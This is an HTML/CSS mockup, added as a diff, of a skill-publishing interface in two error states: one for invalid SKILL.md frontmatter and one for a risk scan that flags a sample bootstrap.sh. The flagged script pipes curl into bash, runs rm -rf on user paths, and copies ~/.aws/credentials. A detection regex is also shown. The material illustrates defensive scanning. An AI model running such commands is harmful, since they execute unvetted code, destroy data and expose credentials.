@@ -1,0 +1,637 @@
+<h2 class="sr-only">Skill publish flow in two error states: invalid SKILL.md format blocking publication, and high-risk scripts requiring manual review</h2>
+
+<style>
+  .er-root { font-family: var(--font-sans); color: var(--color-text-primary); }
+
+  /* State header */
+  .er-state-head {
+    display: flex; align-items: center; gap: 10px;
+    margin: 18px 0 10px;
+  }
+  .er-state-head:first-child { margin-top: 0; }
+  .er-state-num {
+    width: 22px; height: 22px; border-radius: 50%;
+    background: var(--color-background-secondary);
+    color: var(--color-text-secondary);
+    font-size: 12px; font-weight: 500;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .er-state-title { font-size: 15px; font-weight: 500; margin: 0; }
+  .er-state-sub {
+    font-size: 12px; color: var(--color-text-tertiary);
+    margin-left: auto;
+  }
+
+  .er-frame {
+    background: var(--color-background-secondary);
+    border-radius: var(--border-radius-lg);
+    padding: 12px;
+  }
+  .er-app {
+    background: var(--color-background-primary);
+    border: 0.5px solid var(--color-border-tertiary);
+    border-radius: var(--border-radius-lg);
+    overflow: hidden;
+  }
+
+  /* Mini stepper */
+  .er-stepper {
+    display: flex; align-items: center;
+    padding: 14px 18px 14px;
+    gap: 6px;
+    border-bottom: 0.5px solid var(--color-border-tertiary);
+  }
+  .er-step { display: flex; align-items: center; gap: 6px; }
+  .er-step-num {
+    width: 20px; height: 20px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 11px; font-weight: 500;
+    background: var(--color-background-secondary);
+    color: var(--color-text-tertiary);
+  }
+  .er-step.done .er-step-num { background: #E1F5EE; color: #085041; }
+  .er-step.active .er-step-num { background: var(--color-text-primary); color: var(--color-background-primary); }
+  .er-step.fail .er-step-num { background: #FCEBEB; color: #791F1F; }
+  .er-step.warn .er-step-num { background: #FAEEDA; color: #633806; }
+  .er-step-label { font-size: 11.5px; color: var(--color-text-tertiary); }
+  .er-step.done .er-step-label,
+  .er-step.active .er-step-label,
+  .er-step.fail .er-step-label,
+  .er-step.warn .er-step-label { color: var(--color-text-primary); font-weight: 500; }
+  .er-step-line { flex: 1; height: 0.5px; background: var(--color-border-tertiary); margin: 0 3px; }
+  .er-step-line.done { background: #9FE1CB; }
+  .er-step-line.fail { background: #F7C1C1; }
+  .er-step-line.warn { background: #FAC775; }
+
+  /* Body */
+  .er-body { padding: 16px 20px 18px; display: grid; grid-template-columns: minmax(0, 1fr) 200px; gap: 18px; }
+  .er-main { min-width: 0; }
+
+  /* Uploaded file bar — compact, muted */
+  .er-file {
+    display: flex; align-items: center; gap: 12px;
+    padding: 10px 12px; margin-bottom: 14px;
+    border: 0.5px solid var(--color-border-tertiary);
+    border-radius: var(--border-radius-md);
+    background: var(--color-background-secondary);
+  }
+  .er-file-icon {
+    width: 34px; height: 34px; border-radius: 8px;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+    font-family: var(--font-mono); font-size: 10px; font-weight: 500;
+  }
+  .er-file-icon.neutral { background: var(--color-background-primary); color: var(--color-text-secondary); border: 0.5px solid var(--color-border-tertiary); }
+  .er-file-icon.danger { background: #FCEBEB; color: #791F1F; }
+  .er-file-name { font-size: 13px; font-weight: 500; margin: 0; }
+  .er-file-meta { font-size: 11px; color: var(--color-text-tertiary); margin: 1px 0 0; }
+  .er-file-state {
+    margin-left: auto; font-size: 11px; font-weight: 500;
+    padding: 2px 9px; border-radius: 999px;
+  }
+  .er-file-state.neutral { background: var(--color-background-primary); color: var(--color-text-secondary); border: 0.5px solid var(--color-border-tertiary); }
+
+  /* Section card */
+  .er-section {
+    border: 0.5px solid var(--color-border-tertiary);
+    border-radius: var(--border-radius-lg);
+    margin-bottom: 12px; overflow: hidden;
+  }
+  .er-section.fail { border-color: #F7C1C1; }
+  .er-section.warn { border-color: #FAC775; }
+
+  .er-sec-head {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 11px 14px;
+    border-bottom: 0.5px solid var(--color-border-tertiary);
+  }
+  .er-section.fail .er-sec-head { background: #FCEBEB; border-bottom-color: #F7C1C1; }
+  .er-section.warn .er-sec-head { background: #FAEEDA; border-bottom-color: #FAC775; }
+
+  .er-sec-title-row { display: flex; align-items: center; gap: 10px; }
+  .er-check-lg {
+    width: 22px; height: 22px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 12px; font-weight: 500;
+    flex-shrink: 0;
+  }
+  .er-check-lg.pass { background: #E1F5EE; color: #085041; }
+  .er-check-lg.warn { background: #FAC775; color: #633806; }
+  .er-check-lg.fail { background: #F7C1C1; color: #791F1F; }
+
+  .er-sec-title { font-size: 13.5px; font-weight: 500; margin: 0; }
+  .er-sec-title.fail { color: #501313; }
+  .er-sec-title.warn { color: #412402; }
+  .er-sec-sub { font-size: 11px; color: var(--color-text-tertiary); margin: 1px 0 0; }
+  .er-sec-sub.fail { color: #A32D2D; }
+  .er-sec-sub.warn { color: #854F0B; }
+
+  .er-risk-tag {
+    font-size: 11px; padding: 2px 9px; border-radius: 999px; font-weight: 500;
+  }
+  .er-risk-tag.fail { background: #F7C1C1; color: #501313; }
+  .er-risk-tag.warn { background: #FAC775; color: #412402; }
+
+  /* Invalid frontmatter code view */
+  .er-fm {
+    background: var(--color-background-secondary);
+    padding: 12px 14px;
+    font-family: var(--font-mono); font-size: 12px;
+    line-height: 1.8;
+    position: relative;
+  }
+  .er-fm-line {
+    display: block;
+    padding-left: 28px;
+    position: relative;
+    color: var(--color-text-primary);
+  }
+  .er-fm-line .ln {
+    position: absolute; left: 0; top: 0;
+    width: 22px; text-align: right;
+    color: var(--color-text-tertiary);
+    font-size: 11px;
+    border-right: 0.5px solid var(--color-border-tertiary);
+    padding-right: 4px;
+  }
+  .er-fm-line.err {
+    background: #FCEBEB;
+    margin: 0 -14px;
+    padding-left: 42px; padding-right: 14px;
+  }
+  .er-fm-line.err .ln { left: 14px; color: #A32D2D; }
+  .er-fm-line .k { color: var(--color-text-secondary); }
+  .er-fm-line .v { color: var(--color-text-primary); }
+  .er-fm-line .hr { color: var(--color-text-tertiary); }
+  .er-fm-line .missing {
+    background: #F7C1C1; color: #501313;
+    padding: 0 4px; border-radius: 3px;
+    font-style: italic;
+  }
+
+  /* Error details list */
+  .er-errors {
+    padding: 10px 14px;
+    background: var(--color-background-primary);
+  }
+  .er-errors-title {
+    font-size: 11px; color: var(--color-text-tertiary);
+    text-transform: uppercase; letter-spacing: 0.05em;
+    margin: 0 0 8px;
+  }
+  .er-err-row {
+    display: flex; align-items: flex-start; gap: 10px;
+    padding: 8px 0;
+    border-top: 0.5px solid var(--color-border-tertiary);
+    font-size: 13px;
+  }
+  .er-err-row:first-of-type { border-top: none; padding-top: 2px; }
+  .er-err-badge {
+    font-family: var(--font-mono); font-size: 10px;
+    padding: 2px 7px; border-radius: 4px;
+    flex-shrink: 0; font-weight: 500;
+  }
+  .er-err-badge.fail { background: #FCEBEB; color: #791F1F; }
+  .er-err-badge.warn { background: #FAEEDA; color: #633806; }
+  .er-err-body { flex: 1; min-width: 0; }
+  .er-err-body p { margin: 0; font-size: 13px; color: var(--color-text-primary); }
+  .er-err-body p.hint { font-size: 11px; color: var(--color-text-tertiary); margin-top: 2px; font-family: var(--font-mono); }
+
+  /* High-risk scripts view */
+  .er-script-header {
+    padding: 10px 14px;
+    font-family: var(--font-mono); font-size: 11.5px;
+    color: var(--color-text-secondary);
+    background: var(--color-background-secondary);
+    border-bottom: 0.5px solid var(--color-border-tertiary);
+  }
+  .er-script-header .icon { margin-right: 6px; color: var(--color-text-tertiary); }
+  .er-script-header .path { color: var(--color-text-primary); }
+
+  .er-code {
+    background: var(--color-background-primary);
+    font-family: var(--font-mono); font-size: 12px;
+    line-height: 1.85;
+    padding: 10px 0;
+  }
+  .er-code-line {
+    padding: 0 14px 0 42px;
+    position: relative;
+    color: var(--color-text-primary);
+    white-space: pre;
+    overflow-x: auto;
+  }
+  .er-code-line .ln {
+    position: absolute; left: 0; top: 0;
+    width: 26px; text-align: right;
+    color: var(--color-text-tertiary);
+    font-size: 11px;
+    padding-right: 4px;
+  }
+  .er-code-line.flag {
+    background: #FCEBEB;
+  }
+  .er-code-line.flag .ln { color: #A32D2D; }
+  .er-code-line .cmt { color: var(--color-text-tertiary); }
+  .er-code-line .kw { color: #993556; }
+  .er-code-line .danger {
+    background: #F09595; color: #501313;
+    padding: 0 3px; border-radius: 3px;
+  }
+
+  /* Footer */
+  .er-footer {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 12px 20px;
+    border-top: 0.5px solid var(--color-border-tertiary);
+    background: var(--color-background-secondary);
+  }
+  .er-footer-msg { font-size: 12px; display: flex; align-items: center; gap: 6px; }
+  .er-footer-msg.fail { color: #791F1F; }
+  .er-footer-msg.warn { color: #633806; }
+  .er-footer-actions { display: flex; gap: 8px; }
+  .er-cancel {
+    background: transparent; border: none;
+    color: var(--color-text-secondary);
+    font-size: 13px; padding: 7px 12px;
+  }
+  .er-fix-btn {
+    background: var(--color-text-primary);
+    color: var(--color-background-primary);
+    border: none;
+    font-size: 13px; font-weight: 500;
+    padding: 8px 16px;
+    border-radius: var(--border-radius-md);
+    display: flex; align-items: center; gap: 6px;
+  }
+  .er-review-btn {
+    background: var(--color-text-primary);
+    color: var(--color-background-primary);
+    border: none;
+    font-size: 13px; font-weight: 500;
+    padding: 8px 16px;
+    border-radius: var(--border-radius-md);
+    display: flex; align-items: center; gap: 6px;
+  }
+  .er-publish-disabled {
+    background: var(--color-background-secondary);
+    color: var(--color-text-tertiary);
+    border: 0.5px solid var(--color-border-tertiary);
+    font-size: 13px; font-weight: 500;
+    padding: 7px 16px;
+    border-radius: var(--border-radius-md);
+    cursor: not-allowed;
+  }
+
+  /* Sidebar */
+  .er-side {
+    display: flex; flex-direction: column; gap: 12px;
+    min-width: 0;
+  }
+  .er-callout {
+    border-radius: var(--border-radius-lg);
+    padding: 12px 14px;
+    font-size: 12px; line-height: 1.55;
+  }
+  .er-callout.fail { background: #FCEBEB; color: #501313; }
+  .er-callout.warn { background: #FAEEDA; color: #412402; }
+  .er-callout .title {
+    font-size: 13px; font-weight: 500;
+    margin: 0 0 4px;
+    display: flex; align-items: center; gap: 6px;
+  }
+  .er-callout.fail .title { color: #4A1B0C; }
+  .er-callout.warn .title { color: #4A1B0C; }
+  .er-callout p { margin: 0; }
+
+  .er-next {
+    border: 0.5px solid var(--color-border-tertiary);
+    border-radius: var(--border-radius-lg);
+    padding: 12px 14px;
+  }
+  .er-next-label {
+    font-size: 11px; color: var(--color-text-tertiary);
+    text-transform: uppercase; letter-spacing: 0.05em;
+    margin: 0 0 10px;
+  }
+  .er-next-item {
+    font-size: 12px; color: var(--color-text-secondary);
+    line-height: 1.55; padding: 7px 0;
+    border-top: 0.5px solid var(--color-border-tertiary);
+    display: flex; align-items: flex-start; gap: 8px;
+  }
+  .er-next-item:first-of-type { border-top: none; padding-top: 2px; }
+  .er-next-dot {
+    width: 5px; height: 5px; border-radius: 50%;
+    background: var(--color-text-tertiary);
+    margin-top: 7px; flex-shrink: 0;
+  }
+  .er-next-item strong {
+    font-weight: 500; color: var(--color-text-primary);
+    display: block; margin-bottom: 2px;
+  }
+</style>
+
+<div class="er-root">
+
+<!-- ============================================ -->
+<!-- STATE A: Invalid SKILL.md — publish blocked -->
+<!-- ============================================ -->
+<div class="er-state-head">
+  <div class="er-state-num">A</div>
+  <h3 class="er-state-title">Validation failed — publish blocked</h3>
+  <span class="er-state-sub">Missing required frontmatter field</span>
+</div>
+
+<div class="er-frame">
+  <div class="er-app">
+
+    <div class="er-stepper">
+      <div class="er-step done">
+        <div class="er-step-num">
+          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <span class="er-step-label">Upload</span>
+      </div>
+      <div class="er-step-line fail"></div>
+      <div class="er-step fail">
+        <div class="er-step-num">×</div>
+        <span class="er-step-label">Validate</span>
+      </div>
+      <div class="er-step-line"></div>
+      <div class="er-step">
+        <div class="er-step-num">3</div>
+        <span class="er-step-label">Review</span>
+      </div>
+      <div class="er-step-line"></div>
+      <div class="er-step">
+        <div class="er-step-num">4</div>
+        <span class="er-step-label">Live</span>
+      </div>
+    </div>
+
+    <div class="er-body">
+      <div class="er-main">
+
+        <div class="er-file">
+          <div class="er-file-icon neutral">zip</div>
+          <div style="flex: 1; min-width: 0;">
+            <p class="er-file-name">my-skill-draft.zip</p>
+            <p class="er-file-meta">12 KB · 1 file · uploaded 4 seconds ago</p>
+          </div>
+          <span class="er-file-state neutral">Uploaded</span>
+        </div>
+
+        <div class="er-section fail">
+          <div class="er-sec-head">
+            <div class="er-sec-title-row">
+              <div class="er-check-lg fail">×</div>
+              <div>
+                <p class="er-sec-title fail">SKILL.md is invalid — 2 errors</p>
+                <p class="er-sec-sub fail">Cannot proceed until errors are fixed</p>
+              </div>
+            </div>
+            <span class="er-risk-tag fail">Not publishable</span>
+          </div>
+
+          <div class="er-fm">
+<span class="er-fm-line"><span class="ln">1</span><span class="hr">---</span></span>
+<span class="er-fm-line err"><span class="ln">2</span><span class="k">name:</span> <span class="missing">&nbsp;(missing)&nbsp;</span></span>
+<span class="er-fm-line"><span class="ln">3</span><span class="k">description:</span> <span class="v">Helps you set up stuff quickly for deployment and configuration management tasks across teams, and works with any framework or language.</span></span>
+<span class="er-fm-line"><span class="ln">4</span><span class="k">version:</span> <span class="v">1.0.0</span></span>
+<span class="er-fm-line"><span class="ln">5</span><span class="hr">---</span></span>
+          </div>
+
+          <div class="er-errors">
+            <p class="er-errors-title">Errors found</p>
+            <div class="er-err-row">
+              <span class="er-err-badge fail">FAIL</span>
+              <div class="er-err-body">
+                <p>Missing required field: <code style="font-family:var(--font-mono)">name</code></p>
+                <p class="hint">line 2 · agentskills.io spec requires name and description</p>
+              </div>
+            </div>
+            <div class="er-err-row">
+              <span class="er-err-badge warn">WARN</span>
+              <div class="er-err-body">
+                <p>description is vague — semantic search will struggle to match it</p>
+                <p class="hint">line 3 · describe the trigger condition, not the generic capability</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+      <aside class="er-side">
+        <div class="er-callout fail">
+          <p class="title">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>
+            Nothing stored yet
+          </p>
+          <p>No domain event has been emitted. The upload will be discarded if you leave this page.</p>
+        </div>
+        <div class="er-next">
+          <p class="er-next-label">How to fix</p>
+          <div class="er-next-item">
+            <div class="er-next-dot"></div>
+            <div>
+              <strong>Add a name field</strong>
+              Lowercase, hyphen-separated, ≤ 64 characters.
+            </div>
+          </div>
+          <div class="er-next-item">
+            <div class="er-next-dot"></div>
+            <div>
+              <strong>Sharpen the description</strong>
+              Start with the trigger: "When the user wants to…"
+            </div>
+          </div>
+        </div>
+      </aside>
+    </div>
+
+    <div class="er-footer">
+      <span class="er-footer-msg fail">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" x2="9" y1="9" y2="15"/><line x1="9" x2="15" y1="9" y2="15"/></svg>
+        Fix errors in SKILL.md, then re-upload
+      </span>
+      <div class="er-footer-actions">
+        <button class="er-cancel">Cancel</button>
+        <button class="er-fix-btn">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" x2="12" y1="3" y2="15"/></svg>
+          Re-upload fixed zip
+        </button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ================================================== -->
+<!-- STATE B: High-risk scripts detected — review queue -->
+<!-- ================================================== -->
+<div class="er-state-head">
+  <div class="er-state-num">B</div>
+  <h3 class="er-state-title">High-risk scripts detected — review required</h3>
+  <span class="er-state-sub">Published but gated behind human approval</span>
+</div>
+
+<div class="er-frame">
+  <div class="er-app">
+
+    <div class="er-stepper">
+      <div class="er-step done">
+        <div class="er-step-num">
+          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <span class="er-step-label">Upload</span>
+      </div>
+      <div class="er-step-line done"></div>
+      <div class="er-step done">
+        <div class="er-step-num">
+          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <span class="er-step-label">Validate</span>
+      </div>
+      <div class="er-step-line warn"></div>
+      <div class="er-step warn">
+        <div class="er-step-num">!</div>
+        <span class="er-step-label">Review required</span>
+      </div>
+      <div class="er-step-line"></div>
+      <div class="er-step">
+        <div class="er-step-num">4</div>
+        <span class="er-step-label">Live</span>
+      </div>
+    </div>
+
+    <div class="er-body">
+      <div class="er-main">
+
+        <div class="er-file">
+          <div class="er-file-icon danger">zip</div>
+          <div style="flex: 1; min-width: 0;">
+            <p class="er-file-name">env-bootstrap-v1.0.0.zip</p>
+            <p class="er-file-meta">218 KB · 8 files · 1 scripts/ folder · uploaded 2 minutes ago</p>
+          </div>
+          <span class="er-file-state neutral">Validated</span>
+        </div>
+
+        <div class="er-section warn">
+          <div class="er-sec-head">
+            <div class="er-sec-title-row">
+              <div class="er-check-lg fail">!</div>
+              <div>
+                <p class="er-sec-title warn">Risk scan: 3 high-severity findings</p>
+                <p class="er-sec-sub warn">scripts/ detected · engine v1.4 · 1.2s</p>
+              </div>
+            </div>
+            <span class="er-risk-tag fail">High risk</span>
+          </div>
+
+          <div class="er-script-header">
+            <span class="icon">▸</span> <span class="path">scripts/bootstrap.sh</span> · <span>bash</span>
+          </div>
+
+          <div class="er-code">
+<span class="er-code-line"><span class="ln">1</span><span class="cmt">#!/usr/bin/env bash</span></span>
+<span class="er-code-line"><span class="ln">2</span><span class="cmt"># Bootstrap developer environment</span></span>
+<span class="er-code-line"><span class="ln">3</span><span class="kw">set</span> -e</span>
+<span class="er-code-line"><span class="ln">4</span></span>
+<span class="er-code-line flag"><span class="ln">5</span><span class="kw">curl</span> -sSL https://get.example.com/setup.sh | <span class="danger">bash</span></span>
+<span class="er-code-line"><span class="ln">6</span></span>
+<span class="er-code-line flag"><span class="ln">7</span><span class="kw">rm</span> -rf <span class="danger">~/.config/legacy</span> /tmp/*</span>
+<span class="er-code-line"><span class="ln">8</span></span>
+<span class="er-code-line flag"><span class="ln">9</span><span class="kw">cat</span> <span class="danger">~/.aws/credentials</span> &gt;&gt; ./backup.txt</span>
+<span class="er-code-line"><span class="ln">10</span><span class="kw">echo</span> "Done"</span>
+          </div>
+
+          <div class="er-errors">
+            <p class="er-errors-title">Findings · all in scripts/bootstrap.sh</p>
+            <div class="er-err-row">
+              <span class="er-err-badge fail">HIGH</span>
+              <div class="er-err-body">
+                <p>Remote code execution pattern: curl piped to bash</p>
+                <p class="hint">line 5 · downloads and executes unsigned code at install time</p>
+              </div>
+            </div>
+            <div class="er-err-row">
+              <span class="er-err-badge fail">HIGH</span>
+              <div class="er-err-body">
+                <p>Destructive filesystem operation: rm -rf on user paths</p>
+                <p class="hint">line 7 · matches pattern /rm\s+-rf\s+[~/]/</p>
+              </div>
+            </div>
+            <div class="er-err-row">
+              <span class="er-err-badge fail">HIGH</span>
+              <div class="er-err-body">
+                <p>Sensitive credential path accessed: ~/.aws/credentials</p>
+                <p class="hint">line 9 · read from protected directory in the deny-list</p>
+              </div>
+            </div>
+            <div class="er-err-row">
+              <span class="er-err-badge warn">INFO</span>
+              <div class="er-err-body">
+                <p>1 external domain referenced: get.example.com</p>
+                <p class="hint">line 5 · domain is not on the trusted-source registry</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+      <aside class="er-side">
+        <div class="er-callout warn">
+          <p class="title">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" x2="12" y1="9" y2="13"/><line x1="12" x2="12.01" y1="17" y2="17"/></svg>
+            Sent to review queue
+          </p>
+          <p>The skill is stored but hidden from browse until an admin approves. Authors and admins can still view it.</p>
+        </div>
+        <div class="er-next">
+          <p class="er-next-label">What happens next</p>
+          <div class="er-next-item">
+            <div class="er-next-dot"></div>
+            <div>
+              <strong>Flag emitted</strong>
+              A SkillRiskAssessed event with level = HIGH has been written.
+            </div>
+          </div>
+          <div class="er-next-item">
+            <div class="er-next-dot"></div>
+            <div>
+              <strong>Admin notified</strong>
+              Security reviewers see this in their queue within a minute.
+            </div>
+          </div>
+          <div class="er-next-item">
+            <div class="er-next-dot"></div>
+            <div>
+              <strong>You can still iterate</strong>
+              Upload a fixed version to replace this one in the queue.
+            </div>
+          </div>
+        </div>
+      </aside>
+    </div>
+
+    <div class="er-footer">
+      <span class="er-footer-msg warn">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>
+        3 high-severity findings must be resolved or explicitly approved
+      </span>
+      <div class="er-footer-actions">
+        <button class="er-cancel">Withdraw submission</button>
+        <span class="er-publish-disabled">Publish v1.0.0</span>
+        <button class="er-review-btn">
+          Submit for review
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
+        </button>
+      </div>
+    </div>
+  </div>
+</div>
+
+</div>
